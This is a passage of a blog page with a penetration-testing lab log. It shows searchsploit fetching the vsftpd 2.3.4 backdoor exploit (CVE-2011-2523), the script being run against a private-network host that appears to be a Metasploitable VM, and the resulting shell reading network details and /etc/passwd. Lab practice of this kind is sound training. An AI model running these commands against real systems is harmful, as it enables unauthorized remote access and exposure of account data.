class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -m  unix/remote/49757.py </span><br><span class="line"></span><br><span class="line">  Exploit: vsftpd 2.3.4 - Backdoor Command Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/49757</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py</span><br><span class="line">    Codes: CVE-2011-2523</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line">cp: overwrite &#x27;/home/kali/Desktop/cd/49757.py&#x27;? yes</span><br><span class="line">Copied to: /home/kali/Desktop/cd/49757.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# chmod +x 49757.py</span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# ls</span><br><span class="line"> 49757.py  wordlists                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# python ./49757.py  192.168.244.136 </span><br><span class="line">Success, shell opened</span><br><span class="line">Send `exit` to quit shell</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">cdrom</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd</span><br><span class="line">initrd.img</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">nohup.out</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br><span class="line">bind:x:105:113::/var/cache/bind:/bin/false</span><br><span class="line">postfix:x:106:115::/var/spool/postfix:/bin/false</span><br><span class="line">ftp:x:107:65534::/home/ftp:/bin/false</span><br><span class="line">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false</span><br><span class="line">distccd:x:111:65534::/:/bin/false</span><br><span class="line">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span><br><span class="line">service:x:1002:1002:,,,:/home/service:/bin/bash</span><br><span class="line">telnetd:x:112:120::/nonexistent:/bin/false</span><br><span class="line">proftpd:x:113:65534::/var/run/proftpd:/bin/false</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/bin/false</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Dong Cong"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Dong Cong</p>
  <div class="site-description" itemprop="description">bW9ua2V5Y2RAZ21haWwuY29t</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">49</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">69</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        <body>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Dong Cong</span>


</div>

<span id="busuanzi_container_site_pv">Total visits:<span id="busuanzi_value_site_pv"></span></span>
<span class="post-meta-divider">|</span>
<span id="busuanzi_container_site_uv">Number of visitors:<span id="busuanzi_value_site_uv"></span></span>

</body>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
